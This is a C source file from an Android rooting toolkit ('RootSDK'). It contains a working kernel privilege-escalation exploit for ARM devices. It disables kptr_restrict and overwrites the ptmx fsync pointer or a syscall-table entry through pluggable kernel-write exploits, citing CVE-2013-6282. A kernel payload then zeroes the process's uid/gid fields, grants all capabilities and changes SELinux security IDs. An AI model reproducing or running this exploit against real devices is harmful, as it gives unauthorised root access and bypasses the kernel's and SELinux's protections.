/*****************************************************************************
 * Copyright (C) 2013-2014 Ming Hu tewilove<at>gmail.com
 *
 * This file is part of RootSDK.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation; either version 2.1 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston MA 02110-1301, USA.
 *****************************************************************************/


#include "log.h"
#include "kallsyms.h"
#include "ksymbol.h"
#include "kconfig.h"
#include "seccomp.h"
#include "lsm.h"
#include "selinux.h"
#include "miyabi.h"
#include "root.h"
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#define ROOT_METHOD_SYSCALL 1
#define ROOT_METHOD_FOPS    2
#define ROOT_METHOD_INVOKE  3

static int root_kconf_test(const char *name, const char *hint) {
    int rc;
    long ptr;
    char config_data[12];
    int config_size;

    memset(config_data, 0, sizeof(config_data));
    config_size = sizeof(config_data);
    rc = kconfig_get(name, config_data, &config_size);
    if (!rc) {
        if (config_size == 0 || config_size == 0x80000000)
            return 0;
        if (!strcmp(config_data, "y"))
            return 1;
    }
    if (!hint)
        return -1;
    ptr = ksymbol_kallsyms_lookup(hint);
    if (ksymbol_exists(ptr))
        return 1;
    return -1;
}

static int root_kconf_guess(int *kconfig, const char *name, const char *hint, int val) {
    int rc;

    rc = root_kconf_test(name, hint);
    if (rc > 0)
        *kconfig |= val;
    else if (rc == 0)
        *kconfig &= ~val;

    return rc;
}

static void root_show_pk() {
    int fd;

    fd = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
    if (fd < 0)
        return;
    write(fd, "0", 1);
    close(fd);
}

int root_init(root_ctx *ctx) {
    int rc;
    long ptr;

    //
    memset(ctx, 0, sizeof(*ctx));
    // for anti debug, poke, etc.
    rc = 0; //debugger_disabler_init(&ctx->dd);
    if (rc < 0) {
        LOGV("debugger_disabler_init() failed.");
        return -1;
    }
    // my name
    prctl(PR_GET_NAME, (long) ctx->my_name_old, 0, 0);
    // magic, don't touch
    memcpy(ctx->my_name_new, "tewilovesyouyet!", 16);
    prctl(PR_SET_NAME, (long) ctx->my_name_new, 0, 0);
    // detect LSM
    rc = selinux_enforce_get();
    if (rc >= 0)
        ctx->lsm |= LSM_SE;
    rc = miyabi_exists();
    if (rc > 0)
        ctx->lsm |= LSM_MIYABI;
    // this affects ksymbol_vector_lookup
    // CONFIG_CPU_ENDIAN_BE8
    LOGV("assume CONFIG_CPU_ENDIAN_BE8=n.");
    ctx->kconfig &= ~CONFIG_CPU_ENDIAN_BE8;
    // CONFIG_FRAME_POINTER
    LOGV("assume CONFIG_FRAME_POINTER=y.");
    ctx->kconfig |= CONFIG_FRAME_POINTER;
    // CONFIG_ALIGNMENT_TRAP
    rc = root_kconf_guess(&ctx->kconfig, "CONFIG_ALIGNMENT_TRAP", 0, CONFIG_ALIGNMENT_TRAP);
    if (rc < 0) {
        LOGV("assume CONFIG_ALIGNMENT_TRAP=y.");
        ctx->kconfig |= CONFIG_ALIGNMENT_TRAP;
    }
    // CONFIG_AEABI
    rc = root_kconf_guess(&ctx->kconfig, "CONFIG_AEABI", 0, CONFIG_AEABI);
    if (rc < 0) {
        LOGV("assume CONFIG_AEABI=y.");
        ctx->kconfig |= CONFIG_AEABI;
    }
    // CONFIG_ARM_THUMB
    rc = root_kconf_guess(&ctx->kconfig, "CONFIG_ARM_THUMB", 0, CONFIG_ARM_THUMB);
    if (rc < 0) {
        LOGV("assume CONFIG_ARM_THUMB=y.");
        ctx->kconfig |= CONFIG_ARM_THUMB;
    }
    // CONFIG_OABI_COMPAT
    rc = root_kconf_guess(&ctx->kconfig, "CONFIG_OABI_COMPAT", "sys_oabi_semop", CONFIG_OABI_COMPAT);
    if (rc < 0) {
        LOGV("assume CONFIG_OABI_COMPAT=n.");
        ctx->kconfig &= ~CONFIG_OABI_COMPAT;
    }
    // CONFIG_SECCOMP
    rc = root_kconf_guess(&ctx->kconfig, "CONFIG_SECCOMP", 0, CONFIG_SECCOMP);
    if (rc < 0) {
        if (seccomp_get())
            ctx->kconfig |= CONFIG_SECCOMP;
        else
            ctx->kconfig &= ~CONFIG_SECCOMP;
    }
    // this affects LSM unlocking
    rc = root_kconf_guess(&ctx->kconfig, "CONFIG_KEYS", 0, CONFIG_KEYS);
    if (rc < 0) {
        if (ctx->lsm & LSM_SE) {
            ptr = ksymbol_kallsyms_lookup("selinux_alloc_key");
            if (ksymbol_exists(ptr))
                ctx->kconfig |= CONFIG_KEYS;
            else if (ptr == KSYMBOL_LOOKUP_404)
                ctx->kconfig &= ~CONFIG_KEYS;
            else {
                struct stat fs;

                rc = stat("/proc/sys/kernel/keys", &fs);
                if (!rc) {
                    ctx->kconfig |= CONFIG_KEYS;
                } else {
                    LOGD("assume CONFIG_KEYS=n.");
                    ctx->kconfig &= ~CONFIG_KEYS;
                }
            }
        }
    }
    LOGV("kconfig = 0x%08x.", ctx->kconfig);
    // tricks
    root_show_pk();
    // all exploits
    exploit_init(&ctx->exploits);

    return 0;
}

void root_free(root_ctx *ctx) {
    exploit_free(&ctx->exploits);
    prctl(PR_SET_NAME, ctx->my_name_old, 0, 0);
    //debugger_disabler_free(&ctx->dd);
}

/*
    Basic concept is to overwrite a syscall or any other kernel function pointer then invoke it.
    If sys_call_table cannot be located from ARM vector or /proc/kallsyms, hard coded values are used.
    CVE-2013-6282 is preferred, and try other possible exploit later.
 */

// this is called from kernel
#ifdef __arm__
/*
    current_thread_info = (struct thread_info *)(sp & ~(THREAD_SIZE - 1))
    thread_info + 12 = current.
    current + 4 = stack
    current + ??? = comm
    current + ??? - 8 = cred
 */
#define THREAD_SIZE 8192
static int root_core(int mtd, int lsm, int cfg) {
    register unsigned long sp asm ("sp");
    unsigned long stack, current, cred, security;
    unsigned long *pb, *pe, test, off;

    // XXX: we need to restore modified syscall/fops

    /* */
    stack = sp & ~(THREAD_SIZE - 1);
    current = *((unsigned long *)(stack + 12));
    /* a litte check */
    test = *((unsigned long *)(current + 4));
    if (test != stack)
        return -1001;
    /* search for comm */
    pb = (unsigned long *)(current + 8);
    pe = (unsigned long *)(current + 1024);
    while (pb < pe - 2) {
        /* tewilovesyouyet! */
        if (*pb == 0x69776574 &&
            *(pb + 1) == 0x65766f6c)
            break;
        pb++;
    }
    if (pb == pe - 2)
        return -1002;
    /* this is cred */
    cred = *(pb - 2);
    off = 1;
    /* test for CONFIG_DEBUG_CREDENTIALS */
    test = *((unsigned long *)(cred + 12));
    if (test == 0x43736564 ||
        test == 0x44656144)
        off += 3;
    /* uid, gid, suid, sgid, euid, egid, fsuid, fsgid */
    *((unsigned long *) cred + off) = 0;
    *((unsigned long *) cred + off + 1) = 0;
    *((unsigned long *) cred + off + 2) = 0;
    *((unsigned long *) cred + off + 3) = 0;
    *((unsigned long *) cred + off + 4) = 0;
    *((unsigned long *) cred + off + 5) = 0;
    *((unsigned long *) cred + off + 6) = 0;
    *((unsigned long *) cred + off + 7) = 0;
    /* cap_inheritable, cap_permitted, cap_effective, cap_bset */
    *((unsigned long *) cred + off + 9) = -1;
    *((unsigned long *) cred + off + 10) = -1;
    *((unsigned long *) cred + off + 11) = -1;
    *((unsigned long *) cred + off + 12) = -1;
    *((unsigned long *) cred + off + 13) = -1;
    *((unsigned long *) cred + off + 14) = -1;
    *((unsigned long *) cred + off + 15) = -1;
    *((unsigned long *) cred + off + 16) = -1;
    /* LSM */
    if (lsm & LSM_SE) {
        security = *((unsigned long *) cred + off + 17 + ((cfg & CONFIG_KEYS) ? 4 : 0));
        // set sids to 1
        *((unsigned long *) security) = 1;
        *((unsigned long *) security + 1) = 1;
        *((unsigned long *) security + 2) = 1;
        *((unsigned long *) security + 3) = 1;
        *((unsigned long *) security + 4) = 1;
        *((unsigned long *) security + 5) = 1;
    }

    return 0;
}
#else
static int root_core(int mtd, int lsm, int cfg) {
    return -1;
}
#endif

// XXX: overwrite llseek to avoid globals if we have a clean write32()
static int sLSM = 0;
static int sCFG = 0;

// XXX: ???
static int root_core_invoke(void) {
    int mtd, lsm, cfg;

    mtd = ROOT_METHOD_INVOKE;
    lsm = sLSM;
    cfg = sCFG;
    return root_core(mtd, lsm, cfg);
}

static loff_t root_core_fsync(void *f, loff_t start, loff_t end, int data) {
    int mtd, lsm, cfg;

    mtd = ROOT_METHOD_FOPS;
    lsm = sLSM;
    cfg = sCFG;
    return root_core(mtd, lsm, cfg);
}

static int root_core_syscall(long which, unsigned long bus, unsigned long devfn) {
    int mtd, lsm, cfg;

    mtd = ROOT_METHOD_SYSCALL;
    lsm = which;
    cfg = (int) bus;
    return root_core(mtd, lsm, cfg);
}

static int root_write_value_at(exploit_t *bgn, exploit_t **end, long addr, long value, int flags) {
    int rc = -1, mm = -1;
    exploit_t *exp;
    long kpa, kps, kva, kvs;
    // int test = 0x33333333;

    rc = kernel_paddr_get(&kpa, &kps);
    if (rc < 0)
        mm = 0;
    rc = kernel_vaddr_get(&kva, &kvs);
    if (rc < 0)
        mm = 0;
    rc = -1;
    for (exp = bgn; exp->name; exp++) {
        if (!exp->write32 && !exp->mmap) {
            LOGV("ignored `%s`.", exp->name);
            continue;
        }
        LOGV("try `%s`.", exp->name);
        rc = exp->init(&exp->opaque);
        if (!rc) {
            // write32 modifies VA
            if (exp->write32 && (flags & exp->flags)) {
                // rc = exp->write32(exp->opaque, (long) &test, value);
                // LOGV("test = %p", (void *) test);
                rc = exp->write32(exp->opaque, addr, value);
            }
            // mmap maps kernel PA
            if (mm && rc && exp->mmap) {
                // XXX: check addr is inside mapping
                for (;;) {
                    void *mapped;
                    kallsyms_t ks;

                    mapped = exp->mmap(exp->opaque, kpa, kvs);
                    if (mapped == MAP_FAILED)
                        break;
                    // verify this is really kernel memory
                    rc = kallsyms_init(&ks, mapped, kvs);
                    if (!rc) {
                        if (!(exp->flags & EXPLOIT_MMAP_ABNORMAL)) {
                            *((long *)((addr - kva) + (char *) mapped)) = value;
                            rc = msync(mapped, kvs, MS_SYNC);
                            rc |= munmap(mapped, kvs);
                        } else {
                            // TODO:
                            rc = -1;
                        }
                        kallsyms_free(&ks);
                    }
                    if (!rc)
                        break;
                }
            }
            exp->free(&exp->opaque);
            if (!rc)
                break;
        }
    }
    if (*end)
        *end = exp->name ? ++exp : exp;

    return rc;
}

static int root_fops(root_ctx *ctx) {
    long ptr = 0;
    ksymbol_static_data_t *me = 0;
    int rc, fd;
    exploit_t *bgn, *next;
    uid_t uid, euid, suid;

    me = ksymbol_static_lookup();
    if (me)
        ptr = me->victim_fops;
    if (!ksymbol_valid(ptr))
        ptr = ksymbol_kallsyms_lookup("ptmx_fops");
    if (!ksymbol_valid(ptr))
        ptr = ksymbol_exploit_lookup(ctx->exploits, "ptmx_fops");
    if (!ksymbol_valid(ptr))
        return -1;
    // file_operations->fsync
    ptr += 56;
    // call each exp
    rc = -1;
    for (bgn = ctx->exploits; bgn && bgn->name; bgn = next) {
        /* the exploit must be capable to write kernel BSS/data */
        rc = root_write_value_at(bgn, &next, ptr, (long) root_core_fsync, -1);
        if (rc) {
            if (next && next->name) {
                continue;
            } else {
                LOGD("root_write_value_at() failed.");
                break;
            }
        }
        // trigger
        fd = open(me ? me->victim_device : "/dev/ptmx_fops", O_RDWR);
        if (fd < 0) {
            // LOGE("open()");
            return -1;
        }
        // XXX: ugly
        sLSM = ctx->lsm;
        sCFG = ctx->kconfig;
        rc = fsync(fd);
        close(fd);
        if (!rc) {
            getresuid(&uid, &euid, &suid);
            if (!uid && !euid && !suid)
                break;
            else
                rc = -1;
        }
    }

    return rc;
}

// __NR_pciconfig_iobase
#define __NR_victim ((__NR_SYSCALL_BASE+271))

static int root_syscall(root_ctx *ctx) {
    int rc;
    long ptr = 0;
    ksymbol_static_data_t *me;
    exploit_t *bgn, *next;
    uid_t uid, euid, suid;

    me = ksymbol_static_lookup();
    if (me)
        ptr = me->victim_syscall;
    if (!ksymbol_valid(ptr))
        ptr = ksymbol_vector_lookup(ctx->kconfig, "sys_call_table");
    if (!ksymbol_valid(ptr))
        ptr = ksymbol_kallsyms_lookup("sys_call_table");
    if (!ksymbol_valid(ptr))
        ptr = ksymbol_exploit_lookup(ctx->exploits, "sys_call_table");
    if (!ksymbol_valid(ptr))
        return -1;
    // call each exp
    rc = -1;
    for (bgn = ctx->exploits; bgn && bgn->name; bgn = next) {
        /* the exploit must be capable to write kernel text */
        rc = root_write_value_at(bgn, &next, ptr + __NR_victim * 4, (long) root_core_syscall, EXPLOIT_POKE_TEXT);
        //rc = root_write_value_at(bgn, &next, &test, 0x12345678, EXPLOIT_POKE_TEXT);
        if (rc) {
            if (next && next->name) {
                bgn = next;
                continue;
            } else {
                LOGD("root_write_value_at() failed.");
                break;
            }
        }
        rc = syscall(__NR_victim, ctx->lsm, ctx->kconfig, 0);
        if (!rc) {
            getresuid(&uid, &euid, &suid);
            if (!uid && !euid && !suid)
                break;
            else
                rc = -1;
        }
    }
    return rc;
}

static int root_invoke(root_ctx *ctx) {
    int rc;
    exploit_t *exp;
    uid_t uid, euid, suid;

    for (exp = ctx->exploits; exp->name; exp++) {
        if (exp->invoke) {
            LOGV("try `%s`.", exp->name);
            rc = exp->init(&exp->opaque);
            if (!rc) {
                sLSM = ctx->lsm;
                sCFG = ctx->kconfig;
                rc = exp->invoke(exp->opaque, (long) root_core_invoke);
                exp->free(&exp->opaque);
            }
            if (!rc) {
                getresuid(&uid, &euid, &suid);
                if (!uid && !euid && !suid)
                    return 0;
            }
        }
    }

    return -1;
}

int root_321(root_ctx *ctx) {
    int rc;

    LOGV("attempt #1.");
    rc = root_fops(ctx);
    if (rc) {
        LOGV("attempt #2.");
        rc = root_syscall(ctx);
    }
    if (rc) {
        LOGV("attempt #3.");
        rc = root_invoke(ctx);
    }

    if (!rc) {
        if (ctx->lsm & LSM_SE)
            rc = selinux_attr_set_priv();
    }

    return rc;
}

